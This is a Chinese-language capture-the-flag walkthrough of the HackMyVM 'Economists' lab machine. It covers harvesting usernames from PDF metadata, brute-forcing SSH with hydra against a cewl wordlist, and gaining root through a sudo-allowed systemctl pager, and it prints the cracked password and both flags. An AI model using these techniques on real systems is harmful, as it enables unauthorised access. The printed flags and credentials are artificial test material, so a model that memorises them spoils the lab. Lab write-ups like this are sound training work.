# Economists

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=Economists

[video](https://www.bilibili.com/video/BV1fKXMYxEw5/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

80 上没看到信息，文件都是静态 html 文件没有接口。

ftp 可匿名登陆，都是 pdf 文件，看看 pdf 文件的元数据信息吧，就发现了几个 author 名字：

```
exiftool *.pdf|grep Author|awk -F ':' '{print $2}'|sed 's/ //g'
joseph
richard
crystal
catherine
catherine
```

有了用户名，现在就是需要一个密码字典，先使用 cewl 收集一下 web 上的单词作为密码字典：

```
cewl -w pass.txt -d 3 http://192.168.5.40/
```

然后对 ssh 进行爆破

```
hydra -t 64 -L user -P pass.txt ssh://192.168.5.40

[22][ssh] host: 192.168.5.40   login: joseph   password: wealthiest
```

ssh 进行登陆，先得到了 user flag:

```
joseph@elite-economists:~$ cat user.txt
Flag: HMV{37q3p33CsMJgJQbrbYZMUFfTu}
```

sudo -l 显示 /usr/bin/systemctl status 执行之后页面很长，显示的类似于 less 查看长文件时，这里就可以使用类似于 less 中的提权 !/bin/bash 拿到最终 flag:

```
root@elite-economists:~# cat root.txt
Flag: HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}
```
